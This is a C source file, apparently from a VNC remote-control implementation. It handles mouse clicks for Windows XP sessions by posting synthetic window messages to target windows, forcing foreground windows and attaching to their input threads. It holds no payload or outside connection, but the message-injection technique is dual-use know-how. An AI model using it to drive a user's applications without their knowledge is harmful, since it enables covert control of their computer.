//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: mouse_xp.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	mouse event handling for winxp

#include "project.h"
#include "kbd.h"
#include "wnd_watcher.h"

VOID 
	MouseEventXP(
		PVNC_SESSION pSession,
		HWND hWnd,
		HWND hParent,
		PWINDOWINFO wiInfo,
		WORD wHitTest,
		DWORD uMsg,
		DWORD ncMessage,
		LPARAM dwClientCursorPos,
		LPARAM dwScreenCursorPos
		)
{
	HWND hWndParent = GetAncestor(hWnd,GA_ROOT);
	HWND hPopUp     = GetTopPopupWindow(&pSession->Desktop,hWndParent);
	HWND hTopLevel  = NULL;

	WORD wCommand =0;
	WPARAM wParam = 0;
	BOOL bIsMDI = FALSE;

	if (IsMDI(hWnd)){
		hWndParent = hWnd;
		bIsMDI = TRUE;
	}

	if ((uMsg == WM_LBUTTONDOWN) || (uMsg == WM_MBUTTONDOWN) || (uMsg == WM_RBUTTONDOWN))
	{
		HWND hMenu=NULL;
		DWORD_PTR dwResult = 0;

		SS_GET_DATA(pSession)->bTrayIconUnderCursor = FALSE;

		if ((hWnd == pSession->Desktop.hTrayUserNotifyToolbarWnd) || 
			(hWnd == pSession->Desktop.hTraySystemNotifyToolbarWnd) || 
			(hWnd == pSession->Desktop.hTrayUserNotifyOverflowToolbarWnd))
		{
			DWORD_PTR Result;

			if ( SendMessageTimeout(
				hWnd,SS_GET_DATA(pSession)->dwVNCMessage,
				VMW_TBHITTEST,
				dwClientCursorPos,
				SMTO_ABORTIFHUNG | SMTO_NORMAL,
				WND_MSG_TIMEOUT,
				&Result
				) && Result >= 0 )
			{
				SS_GET_DATA(pSession)->bTrayIconUnderCursor = TRUE;
			}
		}

		if ( IsMenuEx( &pSession->Desktop, hWnd ) ){
			hMenu=hWnd;
		}
		else if (IsMenuEx(&pSession->Desktop,hWndParent)){
			hMenu=hWndParent;
		}
		DestroyMenus(&pSession->Desktop,hMenu);

		if (uMsg == WM_LBUTTONDOWN){
			wParam=VMW_TBLCLICK;
		}
		else if (uMsg == WM_RBUTTONDOWN){
			wParam=VMW_TBRCLICK;
		}

		if ((hWnd == pSession->Desktop.hToolBarWnd) && (wParam)){
			PostMessage(
				pSession->Desktop.hToolBarWnd,
				SS_GET_DATA(pSession)->dwVNCMessage,
				wParam,
				dwClientCursorPos
				);
		}

		hTopLevel = pSession->Desktop.hLastTopLevelWindow;
		if ((IsXP()) || ((hTopLevel != pSession->Desktop.hTrayWnd) && (hTopLevel != pSession->Desktop.hStartBtnWnd))){
			hTopLevel = SS_GET_FOREGROUND_WND(pSession);
		}

		if ((hParent != hTopLevel) && 
			(!(GetWindowClassFlags(&pSession->Desktop,hParent) & WCF_NO_CAPTURE)))
		{
			BOOL bUpdateFgd = TRUE;
			if (hPopUp)
			{
				hWnd=hPopUp;
				hParent = GetAncestor(hWnd,GA_ROOT);
			}

			// check if old foreground window is a child of new fgd windows
			// and old window is a tool window
			if ( hParent == GetWindow(hTopLevel,GW_OWNER))
			{
				WINDOWINFO wiInfo;
				wiInfo.cbSize=sizeof(WINDOWINFO);
				if ( GetWindowInfo(hTopLevel,&wiInfo) && ( wiInfo.dwExStyle & WS_EX_TOOLWINDOW ) )
				{
					bUpdateFgd = FALSE;
				}
			}

			if ( bUpdateFgd ){
				DbgPrint("SetForegroundWnd hWnd=%p hParent=%p\n",hWnd,hParent);
				SetForegroundWnd(pSession,hParent);

				if ((SendMessageTimeout(
					hWnd,
					WM_MOUSEACTIVATE,
					(WPARAM)hWndParent,
					MAKELPARAM(wHitTest,uMsg),
					SMTO_ABORTIFHUNG+SMTO_NORMAL,100,&dwResult)) && 
					((dwResult == MA_ACTIVATEANDEAT) || (dwResult == MA_NOACTIVATEANDEAT)))
				{
					return;
				}
			}
		}
	}

	AttachToInput( pSession, hWnd );

	{
		CHAR szClassName[128];
		GetClassNameA(hWnd,szClassName,128);
		switch(uMsg) 
		{
		case WM_LBUTTONUP:
//			DbgPrint("WM_LBUTTONUP hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		case WM_LBUTTONDOWN:
//			DbgPrint("WM_LBUTTONDOWN hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		case WM_RBUTTONUP:
//			DbgPrint("WM_RBUTTONUP hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		case WM_RBUTTONDOWN:
//			DbgPrint("WM_RBUTTONDOWN hWnd=%p Class=%s\n",hWnd,szClassName);
			break;
		}
	}

	PostMessage(hWnd,WM_SETCURSOR,(WPARAM)hWnd,MAKELPARAM(wHitTest,uMsg));
	if (wHitTest == HTCLIENT)
	{
//		DbgPrint("HTCLIENT PostMessage hWnd=%p\n",hWnd);
		PostMessage(
			hWnd,
			MouseCheckForDoubleClick(pSession,hWnd,uMsg,dwScreenCursorPos),
			KbdUpdateInputState(pSession,0,FALSE),
			dwClientCursorPos
			);
		DettachToInput( pSession, hWnd );
		return;
	}

	ncMessage = 
		MouseCheckForDoubleClick(
			pSession,
			hWnd,
			ncMessage,
			dwScreenCursorPos
			);

	switch (wHitTest)
	{
	case HTSYSMENU:
		{
			if (ncMessage == WM_NCLBUTTONDBLCLK)
			{
				HMENU hMenu = GetSystemMenu(hWnd,FALSE);
				if (hMenu)
				{
					wCommand = GetMenuDefaultItem ( hMenu,FALSE,GMDI_GOINTOPOPUPS);
					if (wCommand != -1)
					{
						MENUITEMINFO miiInfo;
						miiInfo.cbSize=sizeof(miiInfo);
						miiInfo.fMask=MIIM_STATE;
						if (GetMenuItemInfo(hMenu,wCommand,MF_BYCOMMAND,&miiInfo))
						{
							if (miiInfo.fState & MFS_GRAYED)
								wCommand=0;
						}
					}
					else{
						wCommand=0;
					}
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
			}
			break;
		}
	case HTMINBUTTON:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				//if (wiInfo->dwStyle & WS_MINIMIZEBOX)
				{
					wCommand=SC_MINIMIZE;
				}
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			break;
		}
	case HTMAXBUTTON:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				//if (wiInfo->dwStyle & WS_MAXIMIZEBOX)
				{
					wCommand=(wiInfo->dwStyle & WS_MAXIMIZE) ? SC_RESTORE:SC_MAXIMIZE;
				}
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			break;
		}
	case HTCLOSE:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				wCommand=SC_CLOSE;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			break;
		}
	case HTHELP:
		{
			if (ncMessage == WM_NCLBUTTONUP)
			{
				wCommand=SC_CONTEXTHELP;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
			}else if ( ncMessage == WM_NCLBUTTONDOWN ){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				goto postMessage;
			}
			break;
		}
	case HTVSCROLL:
	case HTHSCROLL:
		{
			if (ncMessage == WM_NCRBUTTONUP){
				wCommand=0xFFFF;
				break;
			}else if (ncMessage == WM_NCLBUTTONDOWN){
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					HTNOWHERE,
					TRUE
					);
			}
			goto postMessage;
		}
	case HTMENU:
		{
			if (ncMessage == WM_NCLBUTTONDOWN)
			{
				PostMessage(hWnd,SS_GET_DATA(pSession)->dwVNCMessage,VMW_EXECUTE_MENU,0);
				break;
			}
			else if (ncMessage == WM_NCMOUSEMOVE)
			{
				PostMessage(hWnd,SS_GET_DATA(pSession)->dwVNCMessage,VMW_HILITE_MENU,0);
				break;
			}
		}
	case HTCAPTION:
		{
			if (ncMessage == WM_NCLBUTTONDBLCLK){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				goto postMessage;
			}
			else if (ncMessage == WM_NCRBUTTONUP){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				wCommand=0xFFFF;
			}
			else if (ncMessage == WM_NCLBUTTONDOWN){
				if ( !bIsMDI ){
					hWnd = GetAncestor(hWnd,GA_ROOT);;
				}
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					wHitTest,
					TRUE
					);
			}
			break;
		}
	case HTLEFT:
	case HTRIGHT:
	case HTTOP:
	case HTTOPLEFT:
	case HTTOPRIGHT:
	case HTBOTTOM:
	case HTBOTTOMLEFT:
	case HTBOTTOMRIGHT:
		{
			if ( !bIsMDI ){
				hWnd = GetAncestor(hWnd,GA_ROOT);;
			}
			if (ncMessage == WM_NCLBUTTONDOWN){
				MouseChangeCapture(
					pSession,
					GetWindowThreadProcessId(hWnd,NULL),
					hWnd,
					wHitTest,
					TRUE
					);
			}
			break;
		}
	default:
postMessage:
		{
			PostMessage(hWnd,ncMessage,wHitTest,dwScreenCursorPos);
			break;
		}
	}

	if (wCommand)
	{
		if (wCommand == 0xFFFF){
			PostMessage(hWnd,WM_CONTEXTMENU,(WPARAM)hWnd,dwScreenCursorPos);
		}
		else{
			PostMessage(hWnd,WM_SYSCOMMAND,wCommand,dwScreenCursorPos);
		}
	}

	if ( uMsg == WM_LBUTTONDOWN || uMsg == WM_MBUTTONDOWN || uMsg == WM_RBUTTONDOWN ){

		SetForegroundWnd( pSession, hWndParent );
	}

	DettachToInput( pSession, hWnd );
}